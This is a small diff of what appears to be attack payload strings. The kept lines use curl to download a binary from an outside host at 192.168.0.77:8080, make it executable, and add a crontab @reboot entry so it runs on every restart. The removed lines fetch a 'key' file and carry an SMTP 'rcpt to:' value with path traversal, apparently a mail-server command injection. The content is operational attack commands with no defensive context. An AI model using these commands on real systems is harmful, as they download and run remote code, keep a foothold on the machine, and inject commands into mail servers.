@@ -1,11 +1,4 @@
 
-"""/bin/sh -c \'(crontab -l 2>/dev/null; echo \"@reboot home/exploit/var/tmp/utility\") | crontab -\'\""""
+"""/bin/sh -c \'(crontab -l 2>/dev/null; echo \"@reboot /var/tmp/utility\") | crontab -\'\""""
 
 "/bin/sh -c 'su - exploit -c \"curl -k -o /var/tmp/utility https://192.168.0.77:8080/utility\"; chmod +x /var/tmp/utility'"
-
-"/bin/sh -c 'su - exploit -c \"curl -k -o /var/tmp/pkey.txt https://192.168.0.77:8080/key\"; chmod +x /var/tmp/pkey.txt'"
-
-
-
-
-rcpt to:!../../home/exploit/Documents/test_file.py
